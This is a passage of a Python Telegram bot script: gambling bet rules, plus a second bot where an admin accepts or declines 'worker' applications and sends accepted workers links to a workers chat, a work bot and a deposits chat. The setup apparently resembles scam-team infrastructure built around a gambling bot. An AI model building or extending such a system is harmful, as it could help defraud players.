                                           "либо же если Ваше число будет равно 50, то тогда Вы получаете выигрыш равный 10 Вашим ставкам. Но вероятность выпадения данного числа намного ниже.\n\nУдачи!"
            bot.send_message(message.chat.id, msg, reply_markup=keyboardaccept)
        else:
            bot.send_message(message.chat.id, menutext(base), reply_markup=getkeyboard(base[10], base[0]))



    @bot2.message_handler(content_types=['text'])
    def send_text2(message):
        thread = Thread(target=answer2, args=(message,))
        thread.start()


    @bot2.callback_query_handler(func=lambda c:True)
    def callback_inline(c):
        print(c)
        con = sqlite3.connect("bot.db")
        cur = con.cursor()
        cur.execute(f"SELECT * FROM bottable WHERE id='{topadmin}'")
        stat = cur.fetchone()[5]
        try:
            stat = list(stat.split("#"))
        except:
            stat = []

        if "accept" in c.data:
            print("ACCEPTING")
            cur.execute("UPDATE bottable SET worker = (?) WHERE id = (?)", (1, int(c.data[6:])))
            con.commit()
            print(int(c.data[6:]))
            kb = telebot.types.InlineKeyboardMarkup()
            item1 = telebot.types.InlineKeyboardButton(text="Беседа воркеров", url=workerchat)
            item2 = telebot.types.InlineKeyboardButton(text="Бот для работы", url="tg://resolve?domain="+botname)
            item3 = telebot.types.InlineKeyboardButton(text="Пополнения", url=moneychat)
            kb.add(item1, item2, item3)
            bot2.send_message(topadmin,"Принято")
            bot2.send_message(int(c.data[6:]), "🥳Ваша заявка была принята\n\n✅Обязательно прочти в беседе закреп\n\n❗Состоять в беседе обязательно, иначе не будет выплаты , это делается для проверки фейков❗", reply_markup=kb)
            stat.append(str(int(time.time())) + ",1")
            updstat = "#".join(stat)
            cur.execute("UPDATE bottable SET policy = (?) WHERE id = (?)", (updstat, topadmin))
            con.commit()
            gb = grabglobalbase()
            found = 0
            for base in gb:
                if base[10] != 2:
                    continue
                c = base[2].split("#")
                kb = telebot.types.InlineKeyboardMarkup()
                item1 = telebot.types.InlineKeyboardButton(text="✅", callback_data='accept' + str(base[0]))
                item2 = telebot.types.InlineKeyboardButton(text="❌", callback_data='decline' + str(base[0]))
                kb.add(item1, item2)
                cur.execute("UPDATE bottable SET comments = (?) WHERE id = (?)", (int(time.time()), base[0]))
                con.commit()
                bot2.send_message(topadmin,"✅ Заявка " + str(base[0]) + "\nПрофиль: @" + base[18] + "\n\nОпыт: " +c[0] + "\n\nВремя: " + c[1] + "\n\nОткуда узнал: " + c[2], reply_markup=kb)
                found = 1
                break
            if found == 0:
                bot2.send_message(topadmin, "Заявок больше нет")
        elif "decline" in c.data:
            print("DECLINING")
            cur.execute("UPDATE bottable SET worker = (?) WHERE id = (?)", (0, int(c.data[7:])))
            con.commit()
            bot2.send_message(topadmin, "Отклонено")
            bot2.send_message(int(c.data[7:]), "Ваша заявка была отклонена")
            gb = grabglobalbase()
            found = 0
            stat.append(str(int(time.time())) + ",0")
            updstat = "#".join(stat)
            cur.execute("UPDATE bottable SET policy = (?) WHERE id = (?)", (updstat, topadmin))
            con.commit()
            for base in gb:
                if base[10] != 2:
                    continue
                c = base[2].split("#")
                kb = telebot.types.InlineKeyboardMarkup()
                item1 = telebot.types.InlineKeyboardButton(text="✅", callback_data='accept' + str(base[0]))
                item2 = telebot.types.InlineKeyboardButton(text="❌", callback_data='decline' + str(base[0]))
                kb.add(item1, item2)
                cur.execute("UPDATE bottable SET comments = (?) WHERE id = (?)", (int(time.time()), base[0]))
                con.commit()
                bot2.send_message(topadmin,"✅ Заявка " + str(base[0]) + "\nПрофиль: @" + base[18] + "\n\nОпыт: " +c[0] + "\n\nВремя: " + c[1] + "\n\nОткуда узнал: " + c[2], reply_markup=kb)
                found = 1
                break
            if found == 0:
                bot2.send_message(topadmin, "Заявок больше нет")

    def poller2():
        start = 1
        while True:
            if start == 1:
                try:
                    print("START POLLING BOT2")
                    bot2.polling()
                    start = 0
                    time.sleep(60)
                except requests.exceptions.ConnectTimeout:
                    print("No connection")
                except:
                    print("BOT2 ERROR")
                    f = open("errors.txt", "a", encoding='utf-8')
                    f.write(traceback.format_exc() + "\n")
                    f.close()
                    start = 1


    thread = Thread(target=poller2, args=())
    thread.start()


    #"""
    @bot.message_handler(content_types=['text'])
    def send_text(message):
        thread1 = Thread(target=answer, args=(message,))
        thread1.start()
    start = 1
    while True:
        if start == 1:
            try:
                print("START POLLING BOT1")
                bot.polling()
                start = 0
                time.sleep(60)
            except requests.exceptions.ConnectTimeout:
                print("No connection")
            except:
                print("BOT1 ERROR")
                f = open("errors.txt", "a", encoding='utf-8')
                f.write(traceback.format_exc() + "\n")
                f.close()
                start = 1
                break
    #"""
except requests.exceptions.ConnectTimeout:
    print("No connection")
except:
    f = open("errors.txt", "a", encoding='utf-8')
    f.write(traceback.format_exc() + "\n")
    f.close()
